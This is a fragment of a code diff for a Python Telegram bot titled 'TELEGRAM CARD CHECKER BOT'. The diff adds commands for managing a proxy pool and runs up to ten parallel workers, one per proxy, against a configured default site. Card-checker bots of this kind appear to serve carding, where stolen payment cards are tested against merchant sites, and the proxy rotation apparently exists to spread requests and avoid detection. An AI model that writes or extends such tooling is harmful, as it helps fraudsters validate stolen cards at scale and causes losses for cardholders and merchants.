+    elif text_lower.startswith("/listproxies"):
+        handle_listproxies(chat_id, user_id, text, user_msg_id)
+    elif text_lower.startswith("/delproxy"):
+        handle_delproxy(chat_id, user_id, text, user_msg_id)
+    elif text_lower.startswith("/clearproxies"):
+        handle_clearproxies(chat_id, user_id, user_msg_id)
+    elif text_lower.startswith("/proxystatus"):
+        handle_proxystatus(chat_id, user_id, user_msg_id)
 
 def main():
     """Main bot loop with long polling"""
@@ -1664,16 +2148,23 @@ def main():
     print("  TELEGRAM CARD CHECKER BOT")
     print("=" * 60)
 
+    # Load proxy pool from file on startup
+    load_proxy_pool()
+
     bot_info = get_bot_info()
     if not bot_info:
         print("[ERROR] Invalid bot token! Cannot connect to Telegram API.")
         return
+
+    pool_size = len(get_proxy_pool())
+    max_workers = max(1, min(pool_size, 10)) if pool_size > 0 else 1
 
     print(f"[OK] Bot connected: @{bot_info.get('username', 'unknown')}")
     print(f"[OK] Bot name: {bot_info.get('first_name', 'unknown')}")
     print(f"[OK] API: {API_ENDPOINT}")
     print(f"[OK] Default site: {DEFAULT_SITE}")
     print(f"[OK] Default proxy: {DEFAULT_PROXY[:50]}...")
+    print(f"[OK] Proxy pool: {pool_size} proxies (parallel x{max_workers})")
     print(f"[OK] Auto-delete: {AUTO_DELETE_DELAY}s")
     print(f"[OK] Settings: per-user (individual)")
     print("=" * 60)
